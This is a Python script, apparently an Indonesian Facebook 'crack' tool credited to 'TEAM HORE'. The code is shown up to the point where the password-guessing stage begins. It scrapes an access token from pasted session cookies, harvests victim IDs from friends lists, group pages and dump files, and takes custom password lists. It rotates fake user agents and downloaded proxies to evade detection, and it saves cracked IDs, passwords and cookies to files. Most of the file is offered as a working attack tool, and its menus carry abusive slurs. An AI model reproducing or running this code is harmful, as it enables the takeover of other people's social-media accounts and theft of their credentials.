#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
## RANDOM UA
user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	alvino_xy(f'''\t{asu} 

 ______                 __ __            
/_  __/__ ___ ___ _    / // /__  _______ 
 / / / -_) _ `/  ' \  / _  / _ \/ __/ -_)
/_/  \__/\_,_/_/_/_/ /_//_/\___/_/  \__/ 
                                         
			{m}•{k}•{h}•{sir} Author : TEAM HORE {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tSelamat Datang [green]%s[white] Ngentod'%(my_name)))
	alvino_xy(f'>> Your Idz : '+str(my_id))
	alvino_xy(f'>> Your Ip  : {ip}')
	print('')
	print('>> 1. Crack Publik ')
	print('>> 2. Crack Follower ')
	print('>> 3. Crack Grup   ')
	print('>> 4. Crack File	')
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____alvino__adijaya_____ = input('\n>> Pilih : ')
	if _____alvino__adijaya_____ in ['1']:
		dump_massal()
	elif _____alvino__adijaya_____ in ['2']:
		dump_follower()
	elif _____alvino__adijaya_____ in ['3']:
		error()
	elif _____alvino__adijaya_____ in ['4']:
		crack_file()
	elif _____alvino__adijaya_____ in ['5']:
		result()
	elif _____alvino__adijaya_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('>> Hasil OK Anda ')
	print('>> Hasil CP Anda ')
	print('>> Kembali	')
	kz = input('\n>> Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Njing ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('>> Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet Bermasalah ')
		exit()
	except (KeyError,IOError):
		print('>> Gagal Mengambil Target ')
		exit()
#------------------[ CRACK-GRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"

def lah():
	print("\r"+balmond+m+" \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ")
	input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m Jika Ingin Langsung Crack !!")
	pass
	setting()
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Masukkan Idz Grup :\x1b[1;94m ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, 'html.parser')
	except requests.exceptions.ConnectionError:
		print(balmond+m+" Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		crack_grup()
	elif berr2=='Kesalahan':
		jalan(balmond+m+" Grup Tidak Ditemukan..")
		time.sleep(0.5)
		crack_grup()
	else:pass
	print(""+balmond+p+" \x1b[1;94m>> Nama Grup :\x1b[1;97m "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+h+" Anggota : -")
	else:
		print(balmond+h+" \x1b[1;94m>> Anggota :\x1b[1;97m "+str(ang[0]))
	grup1(url)
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mJika Berhenti, Mode Pesawat 5 Detik")
	print(balmond+m+" \x1b[1;94mSedang Mengumpulkan ID")
	print(balmond+m+" \x1b[1;94mTekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print('>> File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print('>> Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'>> %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print('>> %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input('\n>> Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{k}>> Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print('>> File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}>> 1. Akun Old ')
	print('>> 2. Akun New ')
	print('>> 3. Random ')
	print('')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print('>> 1. Mobile ')
	print('>> 2. Mbasic ')
	print('>> 3. Touch  ')
	print('>> 4. Mtouch ')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
#	_jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
#	if _jembot_ in ['']:
#		print('>> Pilih Yang Bener Kontol ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
	pwplus=input('>> Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Butuh Kesabaran, Di Larang gopoh {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
